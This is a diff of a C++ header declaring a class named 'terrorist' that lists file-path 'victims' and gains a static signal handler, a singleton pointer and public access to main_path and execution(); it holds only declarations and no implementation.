@@ -7,19 +7,28 @@
 #include <thread>
 #include <fstream>
 #include <mutex>
+#include <csignal>
 
 class terrorist{
 public:
     terrorist(std::string main_victim);
 
+    terrorist();
+
+    static terrorist* get_self();
+
+    std::string main_path;
+
+    void execution();
+
 private:
+    static inline terrorist* self_pointer;
+
     std::list<std::string> victims;
 
     std::list<std::string> current_terrorism;
 
     auto get_iterator(const std::list<std::string> &list, const std::string &copy);
-
-    std::string main_path;
 
     std::vector<std::string> get_all_paths(std::string &root_path);
 
@@ -29,9 +38,11 @@ private:
 
     void terror(std::string &victim_path);
 
-    void execution();
-
     std::mutex lock;
+
+    static inline bool signal;
+
+    static void signal_handler(int signum);
 
 };
 
